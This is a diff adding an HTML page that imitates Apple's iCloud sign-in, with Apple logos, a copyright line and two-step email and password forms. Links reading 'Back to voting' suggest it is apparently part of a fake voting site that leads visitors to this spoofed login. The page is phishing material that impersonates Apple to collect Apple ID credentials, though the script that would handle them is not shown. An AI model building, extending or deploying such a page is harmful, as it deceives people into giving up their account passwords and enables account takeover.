@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud Sign In</title>
+    <link rel="stylesheet" href="icloud-style.css">
+    <link rel="stylesheet" href="toast.css">
+</head>
+
+<body>
+    <!-- Welcome Screen (Shows First) -->
+    <div id="welcomeScreen" class="icloud-container">
+        <div class="icloud-box welcome-box">
+            <!-- Header with Apple Logo and iCloud -->
+            <div class="icloud-header-simple">
+                <svg class="apple-logo-header" width="30" height="30" viewBox="0 0 24 24" fill="white">
+                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                </svg>
+                <h1 class="icloud-title">iCloud</h1>
+            </div>
+
+            <!-- Apple Icon -->
+            <div class="apple-icon-center">
+                <svg width="80" height="80" viewBox="0 0 24 24" fill="white">
+                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                </svg>
+            </div>
+
+            <!-- Welcome Text -->
+            <h2 class="welcome-text">Welcome to iCloud</h2>
+            <p class="subtitle">Secure authentication required to access<br>your account and verify your identity.</p>
+
+            <!-- Continue Button -->
+            <button class="continue-btn" id="continueBtn">Continue with Apple ID</button>
+
+            <!-- Footer Links -->
+            <div class="footer-links">
+                <a href="#" class="footer-link">System Status</a>
+                <a href="#" class="footer-link">Privacy Policy</a>
+            </div>
+            <div class="footer-links">
+                <a href="#" class="footer-link">Terms & Conditions</a>
+            </div>
+            <p class="copyright">Copyright © 2025 Apple Inc. All rights reserved.</p>
+
+            <div class="back-link">
+                <a href="Index.html">← Back to voting</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Screen (Shows After Clicking Continue) -->
+    <div id="loginScreen" class="icloud-container" style="display: none;">
+        <div class="icloud-box">
+            <!-- Header with Apple Logo and iCloud -->
+            <div class="icloud-header">
+                <div class="header-left">
+                    <svg class="apple-logo-header" width="30" height="30" viewBox="0 0 24 24" fill="white">
+                        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                    </svg>
+                    <h1 class="icloud-title">iCloud</h1>
+                </div>
+                
+                <!-- Three Dots Menu -->
+                <div class="menu-dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+
+            <!-- Colorful Apple Logo Animation -->
+            <div class="apple-animation">
+                <svg class="apple-center" width="60" height="60" viewBox="0 0 24 24" fill="white">
+                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                </svg>
+                <!-- Colorful dots animation -->
+                <div class="dots-circle"></div>
+            </div>
+
+            <!-- Sign In Title -->
+            <h2 class="signin-title">Sign in with Apple Account</h2>
+
+            <!-- Login Form -->
+            <form id="icloudForm" class="icloud-form">
+                <div class="form-group">
+                    <input type="text" id="apple-email" placeholder="Email or Phone Number" required>
+                    <button type="button" class="arrow-btn">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 12h14M12 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="keepSignedIn">
+                    <label for="keepSignedIn">Keep me signed in</label>
+                </div>
+
+                <div class="form-links">
+                    <a href="forgot-password.html" class="link-blue">Forgot password? →</a>
+                    <a href="create-account.html" class="link-blue">Create Apple Account</a>
+                </div>
+            </form>
+
+            <!-- Password Step (Hidden Initially) -->
+            <form id="passwordForm" class="password-form" style="display: none;">
+                <div class="form-group">
+                    <input type="password" id="apple-password" placeholder="Password" required>
+                    <button type="submit" class="arrow-btn">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 12h14M12 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="form-links">
+                    <a href="forgot-password.html" class="link-blue">Forgot password? →</a>
+                </div>
+            </form>
+
+            <div class="back-link">
+                <a href="Index.html">← Back to voting</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="icloud-script.js"></script>
+</body>
+
+</html>
